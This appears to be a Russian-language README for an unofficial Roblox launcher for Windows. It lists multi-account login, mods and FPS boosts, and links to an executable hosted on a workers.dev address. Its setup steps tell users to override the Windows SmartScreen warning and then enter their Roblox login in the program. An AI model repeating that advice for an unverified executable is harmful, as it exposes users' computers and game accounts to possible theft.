Лаунчер Roblox для Windows.

## ⬇ [Скачать последнюю версию](https://rlp-mail.robloxlauncherplus.workers.dev/download)

Ссылка всегда отдаёт самую новую версию. Номер версии на значке выше тоже обновляется сам.

## Что умеет

- Несколько аккаунтов Roblox, вход в один клик
- Свои копии Roblox нужной версии
- Моды: небо, курсор, прицел, шрифты, фон за аватаром и свои файлы
- FastFlags
- Авто-перезаход, если выкинуло с сервера
- Буст: повышенный приоритет Roblox и до 240 FPS
- Статистика: сколько времени вы играли
- Сам обновляется: новая версия ставится в течение 5 минут после выхода

## Как запустить

1. Скачайте `Roblox Launcher+.exe` по ссылке выше.
2. Запустите его. Если Windows покажет «Система Windows защитила ваш компьютер», нажмите **Подробнее → Выполнить в любом случае**.
3. Войдите в аккаунт Roblox и нажмите **Играть**.

Ничего устанавливать дополнительно не нужно: всё уже внутри файла.
